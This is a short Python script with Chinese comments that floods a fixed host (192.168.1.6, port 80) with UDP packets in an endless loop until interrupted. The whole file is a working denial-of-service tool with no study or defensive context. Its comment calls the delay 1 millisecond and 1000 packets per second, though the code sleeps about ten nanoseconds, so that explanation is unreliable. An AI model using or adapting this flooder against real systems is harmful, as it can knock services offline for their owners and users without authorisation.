import socket
import time

# 目标IP和端口
target_ip = "192.168.1.6"
target_port = 80

# 创建UDP套接字
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 发送数据包
try:
    while True:
        sock.sendto(b"Hellosbcz", (target_ip, target_port))
        time.sleep(0.00000001)  # 1毫秒 = 1000 PPS
except KeyboardInterrupt:
    print("发送终止")
finally:
    sock.close()